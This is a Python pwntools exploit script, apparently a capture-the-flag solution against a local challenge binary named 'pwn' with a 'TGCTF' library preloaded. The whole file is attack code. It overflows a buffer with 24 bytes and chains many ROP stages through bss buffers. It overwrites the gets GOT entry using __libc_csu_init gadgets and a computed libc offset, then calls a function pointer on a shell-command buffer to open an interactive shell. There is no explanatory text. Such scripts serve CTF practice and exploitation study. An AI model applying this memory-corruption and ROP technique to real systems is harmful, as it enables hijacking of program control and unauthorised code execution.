#!/usr/bin/env python
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
io = process(["./pwn"], env={"LD_PRELOAD": "./TGCTF.so"})
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./pwn")
g = lambda x: next(elf.search(asm(x)))
system_offset = libc.symbols["fgets"]
gets_offset = libc.symbols["gets"]
offset = 0x1c1AE0 + 0x1139
if offset < 0:
    offset &= 0xFFFFFFFF
gets_plt = elf.plt["gets"]
gets_got = elf.got["gets"]
libc_csu_init = elf.symbols["__libc_csu_init"]
pop_rsp_r13_r14_r15_ret = g("pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret")
pop_rbp_ret = g("pop rbp ; ret")
pop_rdi_ret = g("pop rdi ; ret")
pop_r15_ret = g("pop r15 ; ret")
pop_rsi_r15_ret = g("pop rsi ; pop r15 ; ret")
pop_rbp_r14_r15_ret = g("pop rbp ; pop r14 ; pop r15 ; ret")
pop_rbx_rbp_r12_r13_r14_r15_ret = g(
    "pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"
)
add_ebx_esi_ret = g("add ebx, esi ; ret")
leave_ret = g("leave ; ret")
call_at_r12 = g("call QWORD PTR [r12+rbx*8]")
# gdb.attach(p)
bss = 0x602000
buf1 = bss - 0x100
buf2 = bss - 0x200
buf3 = bss - 0x300
buf4 = bss - 0x400
buf5 = bss - 0x500
buf6 = bss - 0x600
buf7 = bss - 0x700
buf8 = bss - 0x800
rop1 = [
    pop_rdi_ret,
    buf1,
    gets_plt,  # rop2
    pop_rdi_ret,
    buf2,
    gets_plt,  # rop4
    pop_rdi_ret,
    buf3,
    gets_plt,  # rop5
    pop_rdi_ret,
    buf4,
    gets_plt,  # rop7
    pop_rdi_ret,
    buf5,
    gets_plt,  # rop9
    pop_rdi_ret,
    buf6,
    gets_plt,  # rop10
    pop_rdi_ret,
    buf7 + 8,
    gets_plt,  # rop13
    pop_rbp_ret,
    buf1 - 8,
    leave_ret,
]
rop2 = [  # buf1
    pop_rdi_ret,
    gets_got + 24,
    gets_plt,  # rop3
    pop_rbp_ret,
    buf2 - 8,
    pop_rsp_r13_r14_r15_ret,
    gets_got,
]
rop3 = [leave_ret]  # gets_got + 24
rop4 = [libc_csu_init, pop_rbp_ret, buf3 - 8, leave_ret]  # buf2
rop5 = [  # buf3
    pop_rdi_ret,
    buf2 - 24,
    gets_plt,  # rop6_1
    pop_rdi_ret,
    buf2 + 32,
    gets_plt,  # rop6_2
    pop_rbp_ret,
    buf2 - 24 - 8,
    leave_ret,
]
rop6_1 = [pop_rbx_rbp_r12_r13_r14_r15_ret]  # buf2 - 24
rop6_2 = [  # buf2 + 32
    pop_rsi_r15_ret,
    offset,
    8,
    add_ebx_esi_ret,
    #    0xdeadbeef,
    libc_csu_init,
    pop_rbp_ret,
    buf4 - 8,
    leave_ret,
]
rop7 = [  # buf4
    pop_rdi_ret,
    gets_got + 28,
    gets_plt,  # rop8
    pop_rbp_ret,
    buf5 - 8,
    pop_rsp_r13_r14_r15_ret,
    gets_got + 4,
]
rop8 = [leave_ret]  # gets_got + 28
rop9 = [libc_csu_init, pop_rbp_ret, buf6 - 8, leave_ret]  # buf5
rop10 = [  # buf6
    pop_rdi_ret,
    buf5 - 24,
    gets_plt,  # rop11_1
    pop_rdi_ret,
    buf5 + 32,
    gets_plt,  # rop11_2
    pop_rbp_ret,
    buf5 - 24 - 8,
    leave_ret,
]
rop11_1 = [pop_rbx_rbp_r12_r13_r14_r15_ret]  # buf5 - 24
rop11_2 = [  # buf5 + 32
    pop_rdi_ret,
    buf2 + 68,
    gets_plt,  # rop12
    pop_rbp_ret,
    buf2 + 68 - 8,
    leave_ret,
]
rop12 = [libc_csu_init, pop_rbp_ret, buf7, leave_ret]  # buf2 + 164
rop13 = [
    pop_rdi_ret,
    buf8,
    gets_plt,  # shell command
    pop_rdi_ret,
    buf8,
    pop_rbx_rbp_r12_r13_r14_r15_ret,
    0,
    0,
    buf2 + 24,
    0,
    0,
    0,
    call_at_r12,
]
payload = (
    b"A" * 24
    + b"".join(map(p64, rop1))
    + b"\n"
    + b"".join(map(p64, rop2))
    + b"\n"
    + b"".join(map(p64, rop4))
    + b"\n"
    + b"".join(map(p64, rop5))
    + b"\n"
    + b"".join(map(p64, rop7))
    + b"\n"
    + b"".join(map(p64, rop9))
    + b"\n"
    + b"".join(map(p64, rop10))
    + b"\n"
    + b"".join(map(p64, rop13))
    + b"\n"
    + b"".join(map(p64, rop3))[:-1]
    + b"\n"
    + b"".join(map(p64, rop6_1))[:-1]
    + b"\n"
    + b"".join(map(p64, rop6_2))
    + b"\n"
    + b"".join(map(p64, rop8))
    + b"\n"
    + b"".join(map(p64, rop11_1))[:-1]
    + b"\n"
    + b"".join(map(p64, rop11_2))
)
io.sendline(payload)
gdb.attach(io)
payload = b"".join(map(p64, rop12)) + b"\n" + b"TGCTF"
io.sendline(payload)
io.interactive()